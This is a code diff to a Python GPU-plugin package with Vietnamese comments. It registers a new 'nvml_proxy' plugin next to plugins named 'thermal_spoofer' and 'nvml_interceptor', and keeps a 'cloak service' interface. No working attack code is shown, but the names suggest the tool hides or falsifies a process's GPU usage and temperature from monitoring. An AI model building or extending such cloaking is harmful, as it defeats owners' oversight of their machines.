@@ -10,9 +10,9 @@ Tach biet hoan toan GPU logic khoi CPU plugins de:
 
 from .core.interfaces import (
     IGPUPlugin,
-    IGPUCloakService, 
+    IGPUCloakService
     # IGPUTelemetryFilter,  # removed - telemetry functionality deprecated
-    IGPUHookManager
+    # IGPUHookManager  # removed - deprecated
 )
 
 from .core.registry import gpu_plugin_registry
@@ -55,6 +55,16 @@ def _auto_register_plugins():
         except Exception as e:
             logger.error(f"❌ Failed to register time_based_manager: {e}")
         
+        # Import và đăng ký nvml_proxy
+        try:
+            from .ipc.nvml_proxy.nvml_proxy_plugin import NVMLProxyPlugin
+            gpu_plugin_registry.register('nvml_proxy', NVMLProxyPlugin)
+            logger.info("✅ Auto-registered: nvml_proxy")
+        except ImportError as e:
+            logger.warning(f"⚠️ Could not import nvml_proxy: {e}")
+        except Exception as e:
+            logger.error(f"❌ Failed to register nvml_proxy: {e}")
+        
         # Báo cáo kết quả đăng ký
         registered_plugins = gpu_plugin_registry.list_plugins()
         logger.info(f"🎉 Auto-registration completed! Registered plugins: {registered_plugins}")
@@ -84,7 +94,7 @@ __all__ = [
     "IGPUPlugin",
     "IGPUCloakService",
     # "IGPUTelemetryFilter",  # removed - telemetry functionality deprecated
-    "IGPUHookManager",
+    # "IGPUHookManager",  # removed - deprecated
     "gpu_plugin_registry",
     "GPUPluginManager",
     "apply_gpu_strategies"
@@ -151,7 +161,8 @@ def apply_gpu_strategies(pid, strategies=None):
         available_plugins = [
             'thermal_spoofer',
             'nvml_interceptor', 
-            'time_based_manager'
+            'time_based_manager',
+            'nvml_proxy'  # ✅ Thêm plugin mới
         ]
         
         logger.info(f"🔄 [Step 2/5] Loading {len(available_plugins)} GPU plugins...")
